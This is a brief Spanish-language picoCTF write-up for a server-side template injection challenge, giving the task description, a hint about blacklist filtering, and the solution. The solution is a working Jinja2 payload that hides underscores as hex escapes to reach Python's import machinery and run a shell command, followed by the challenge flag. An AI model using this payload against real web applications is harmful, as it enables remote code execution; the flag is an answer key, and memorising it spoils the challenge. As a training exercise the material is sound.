#### - **Descripción** 
¡Creé una página web genial donde puedes anunciar lo que quieras! Leí sobre la limpieza de entradas, así que ahora elimino cualquier carácter que pueda ser problemático :)He oído que usar plantillas es una forma genial y modular de crear aplicaciones web. ¡Visita mi sitio web [aquí](http://shape-facility.picoctf.net:57653/) !

#### Pista 
Inyección de plantilla del lado del servidor

¿Por qué es una mala idea incluir personajes en la lista negra para desinfectar la entrada?

#### - **Solución** 
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}


picoCTF{sst1_f1lt3r_byp4ss_7c3c6e7f}
